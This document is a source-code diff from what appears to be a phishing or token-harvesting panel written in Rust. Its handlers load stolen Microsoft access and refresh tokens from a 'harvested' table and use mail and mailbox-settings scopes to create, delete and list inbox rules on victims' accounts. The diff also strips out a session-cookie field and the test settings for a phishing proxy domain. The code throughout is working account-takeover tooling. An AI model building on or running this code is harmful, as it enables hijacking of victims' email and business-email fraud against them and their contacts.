@@ -220,7 +220,7 @@ pub async fn create_inbox_rule(
         Err(_) => {
             // Fall back to harvested table
             let row: crate::HarvestedToken = sqlx::query_as(
-                "SELECT id, email, access_token, refresh_token, expires_at, captured_at, source, ip_address, location, tenant_id, category, account_type, cookie_session, last_refreshed_at, session_status, session_active_at, session_killed_at FROM harvested WHERE id = ?"
+                "SELECT id, email, access_token, refresh_token, expires_at, captured_at, source, ip_address, location, tenant_id, category, account_type, last_refreshed_at FROM harvested WHERE id = ?"
             )
             .bind(&req.token_id)
             .fetch_one(pool)
@@ -238,7 +238,6 @@ pub async fn create_inbox_rule(
                 scopes: vec!["Mail.ReadWrite".to_string(), "Mail.Send".to_string(), "MailboxSettings.ReadWrite".to_string()],
                 last_refreshed_at: Some(chrono::Utc::now()),
                 account_type: row.account_type.or(row.category),
-                cookie_session: row.cookie_session,
             }
         }
     };
@@ -519,7 +518,7 @@ pub async fn delete_rule_handler(
             Ok(t) => Some(t),
             Err(_) => {
                 match sqlx::query_as::<_, crate::HarvestedToken>(
-                    "SELECT id, email, access_token, refresh_token, expires_at, captured_at, source, ip_address, location, tenant_id, category, account_type, cookie_session, last_refreshed_at, session_status, session_active_at, session_killed_at FROM harvested WHERE id = ?"
+                    "SELECT id, email, access_token, refresh_token, expires_at, captured_at, source, ip_address, location, tenant_id, category, account_type, last_refreshed_at FROM harvested WHERE id = ?"
                 )
                 .bind(&rule.token_id)
                 .fetch_one(&state.pool)
@@ -535,7 +534,6 @@ pub async fn delete_rule_handler(
                         scopes: vec!["Mail.ReadWrite".to_string(), "Mail.Send".to_string(), "MailboxSettings.ReadWrite".to_string()],
                         last_refreshed_at: Some(chrono::Utc::now()),
                         account_type: row.account_type.or(row.category),
-                        cookie_session: row.cookie_session,
                     }),
                     Err(e) => {
                         eprintln!("[rules] Failed to retrieve token for rule deletion: {}", e);
@@ -605,7 +603,7 @@ pub async fn fetch_graph_rules_handler(
         Err(_) => {
             // Fall back to harvested table
             match sqlx::query_as::<_, crate::HarvestedToken>(
-                "SELECT id, email, access_token, refresh_token, expires_at, captured_at, source, ip_address, location, tenant_id, category, account_type, cookie_session, last_refreshed_at, session_status, session_active_at, session_killed_at FROM harvested WHERE id = ?"
+                "SELECT id, email, access_token, refresh_token, expires_at, captured_at, source, ip_address, location, tenant_id, category, account_type, last_refreshed_at FROM harvested WHERE id = ?"
             )
             .bind(&token_id)
             .fetch_one(&state.pool)
@@ -621,7 +619,6 @@ pub async fn fetch_graph_rules_handler(
                     scopes: vec!["Mail.ReadWrite".to_string(), "Mail.Send".to_string(), "MailboxSettings.ReadWrite".to_string()],
                     last_refreshed_at: Some(chrono::Utc::now()),
                     account_type: row.account_type.or(row.category),
-                    cookie_session: row.cookie_session,
                 },
                 Err(e) => {
                     return HttpResponse::NotFound().json(serde_json::json!({
@@ -882,7 +879,6 @@ pub async fn run_local_rules_handler(
 mod tests {
     use super::*;
     use crate::AppConfig;
-    use crate::proxy::ProxyConfig;
     use crate::vault::Vault;
     use sqlx::sqlite::SqlitePoolOptions;
     use wiremock::matchers::{method, path};
@@ -950,17 +946,10 @@ mod tests {
             telegram_chat_id: None,
             master_secret: "test_rules_secret".to_string(),
             frontend_url: None,
-            proxy_domain: "baloncloud.eu".to_string(),
-            proxy_enabled: true,
-            proxy_port: 8080,
-            proxy_max_sessions: 50,
-            proxy_rate_limit: 100,
-            proxy_secret: "test_secret".to_string(),
         };
 
         let vault = Vault::new(config.master_secret.clone());
         let http_client = reqwest::Client::new();
-        let proxy_config = ProxyConfig::new(config.proxy_domain.clone());
 
         let response_key = crate::response_crypto::ResponseCrypto::derive_key(&config.master_secret);
 
@@ -970,7 +959,6 @@ mod tests {
             http_client,
             vault,
             response_key,
-            proxy_config,
         }
     }
 
